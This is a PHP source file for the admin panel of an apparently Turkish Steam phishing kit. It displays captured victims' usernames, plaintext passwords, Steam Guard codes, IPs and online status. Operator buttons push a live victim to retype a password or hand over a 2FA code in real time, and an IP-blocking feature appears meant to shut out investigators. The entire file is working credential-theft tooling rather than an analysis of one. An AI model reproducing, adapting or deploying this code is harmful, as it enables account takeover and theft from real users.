
<?php
require_once 'config.php';

// Check if admin is already logged in
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header("Location: admin_login.php");
    exit;
}

// Function to get all credentials
function getCredentials($pdo) {
    $stmt = $pdo->query("SELECT * FROM credentials ORDER BY timestamp DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

// Function to get blocked IPs
function getBlockedIPs($pdo) {
    $stmt = $pdo->query("SELECT * FROM blocked_ips ORDER BY timestamp DESC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

// Handle admin actions
$action_status = '';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Handle IP blocking
    if (isset($_POST['action']) && $_POST['action'] == 'block_ip' && isset($_POST['ip'])) {
        $ip = sanitize_input($_POST['ip']);
        
        // Check if IP already blocked
        $stmt = $pdo->prepare("SELECT * FROM blocked_ips WHERE ip = ?");
        $stmt->execute([$ip]);
        
        if ($stmt->rowCount() == 0) {
            // Insert into blocked_ips
            $stmt = $pdo->prepare("INSERT INTO blocked_ips (ip) VALUES (?)");
            
            if ($stmt->execute([$ip])) {
                // Update credentials status for this IP
                $stmt = $pdo->prepare("UPDATE credentials SET status = 'blocked' WHERE ip = ?");
                $stmt->execute([$ip]);
                
                $action_status = "IP $ip başarıyla engellendi.";
            } else {
                $action_status = "IP engellenirken bir hata oluştu.";
            }
        } else {
            $action_status = "Bu IP zaten engellenmiş.";
        }
    }
    
    // Handle credential status changes
    if (isset($_POST['action']) && isset($_POST['credential_id'])) {
        $credential_id = sanitize_input($_POST['credential_id']);
        
        if ($_POST['action'] == 'retry') {
            $stmt = $pdo->prepare("UPDATE credentials SET status = 'rejected' WHERE id = ?");
            if ($stmt->execute([$credential_id])) {
                $action_status = "Kullanıcı yeniden giriş yapmaya yönlendirildi.";
            }
        } elseif ($_POST['action'] == 'steam_guard') {
            $stmt = $pdo->prepare("UPDATE credentials SET status = 'awaiting_2fa' WHERE id = ?");
            if ($stmt->execute([$credential_id])) {
                $action_status = "Kullanıcı Steam Guard doğrulamasına yönlendirildi.";
            }
        }
    }
}

// Get the data
$credentials = getCredentials($pdo);
$blocked_ips = getBlockedIPs($pdo);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #1b2838;
            color: white;
            font-family: Arial, sans-serif;
        }
        .table-container {
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 8px 12px;
            text-align: left;
            border-bottom: 1px solid #2a3f5f;
        }
        th {
            background-color: #2a475e;
        }
        tr:hover {
            background-color: #2a3f5f;
        }
        .badge {
            padding: 4px 8px;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 500;
        }
        .badge-pending {
            background-color: #f59e0b;
        }
        .badge-completed {
            background-color: #10b981;
        }
        .badge-awaiting_2fa {
            background-color: #3b82f6;
        }
        .badge-rejected {
            background-color: #ef4444;
        }
        .badge-blocked {
            background-color: #6b7280;
        }
    </style>
</head>
<body class="min-h-screen">
    <div class="container mx-auto px-4 py-8">
        <header class="flex justify-between items-center mb-8">
            <h1 class="text-2xl font-bold">Admin Panel</h1>
            <a href="admin_logout.php" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded transition-colors">Çıkış Yap</a>
        </header>
        
        <?php if ($action_status): ?>
        <div class="bg-blue-500/20 border border-blue-500 text-blue-200 px-4 py-3 rounded mb-4">
            <?php echo $action_status; ?>
        </div>
        <?php endif; ?>
        
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <!-- Credentials Section -->
            <div class="bg-[#2a475e]/50 p-4 rounded-lg shadow-lg">
                <h2 class="text-xl font-semibold mb-4">Yakalanan Bilgiler</h2>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Kullanıcı Adı</th>
                                <th>Parola</th>
                                <th>Steam Guard</th>
                                <th>IP</th>
                                <th>Tarih</th>
                                <th>Durum</th>
                                <th>Çevrimiçi</th>
                                <th>İşlemler</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (count($credentials) > 0): ?>
                                <?php foreach ($credentials as $cred): ?>
                                <tr>
                                    <td><?php echo $cred['id']; ?></td>
                                    <td><?php echo $cred['username']; ?></td>
                                    <td><?php echo $cred['password']; ?></td>
                                    <td><?php echo $cred['steamguard'] ? $cred['steamguard'] : '-'; ?></td>
                                    <td><?php echo $cred['ip']; ?></td>
                                    <td><?php echo $cred['timestamp']; ?></td>
                                    <td>
                                        <span class="badge badge-<?php echo $cred['status']; ?>">
                                            <?php 
                                            switch ($cred['status']) {
                                                case 'pending':
                                                    echo 'Bekliyor';
                                                    break;
                                                case 'awaiting_2fa':
                                                    echo '2FA Bekliyor';
                                                    break;
                                                case 'completed':
                                                    echo 'Tamamlandı';
                                                    break;
                                                case 'rejected':
                                                    echo 'Reddedildi';
                                                    break;
                                                case 'blocked':
                                                    echo 'Engellendi';
                                                    break;
                                                default:
                                                    echo $cred['status'];
                                            }
                                            ?>
                                        </span>
                                    </td>
                                    <td>
                                        <?php if ($cred['online']): ?>
                                            <span class="inline-block w-3 h-3 bg-green-500 rounded-full"></span>
                                        <?php else: ?>
                                            <span class="inline-block w-3 h-3 bg-gray-500 rounded-full"></span>
                                        <?php endif; ?>
                                    </td>
                                    <td class="flex space-x-2">
                                        <?php if ($cred['status'] == 'pending'): ?>
                                        <form method="POST" class="inline">
                                            <input type="hidden" name="action" value="retry">
                                            <input type="hidden" name="credential_id" value="<?php echo $cred['id']; ?>">
                                            <button type="submit" class="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs">Retry</button>
                                        </form>
                                        <form method="POST" class="inline">
                                            <input type="hidden" name="action" value="steam_guard">
                                            <input type="hidden" name="credential_id" value="<?php echo $cred['id']; ?>">
                                            <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white px-2 py-1 rounded text-xs">2FA Sor</button>
                                        </form>
                                        <?php else: ?>
                                        -
                                        <?php endif; ?>
                                        <form method="POST" class="inline">
                                            <input type="hidden" name="action" value="block_ip">
                                            <input type="hidden" name="ip" value="<?php echo $cred['ip']; ?>">
                                            <button type="submit" class="bg-gray-500 hover:bg-gray-600 text-white px-2 py-1 rounded text-xs">IP Engelle</button>
                                        </form>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr>
                                    <td colspan="9" class="text-center py-4">Henüz yakalanan bilgi yok.</td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <!-- Blocked IPs Section -->
            <div class="bg-[#2a475e]/50 p-4 rounded-lg shadow-lg">
                <h2 class="text-xl font-semibold mb-4">Engellenen IP'ler</h2>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>IP Adresi</th>
                                <th>Engellenme Tarihi</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (count($blocked_ips) > 0): ?>
                                <?php foreach ($blocked_ips as $ip): ?>
                                <tr>
                                    <td><?php echo $ip['id']; ?></td>
                                    <td><?php echo $ip['ip']; ?></td>
                                    <td><?php echo $ip['timestamp']; ?></td>
                                </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr>
                                    <td colspan="3" class="text-center py-4">Henüz engellenen IP yok.</td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Auto-refresh the page every 30 seconds
        setTimeout(function() {
            window.location.reload();
        }, 30000);
    </script>
</body>
</html>
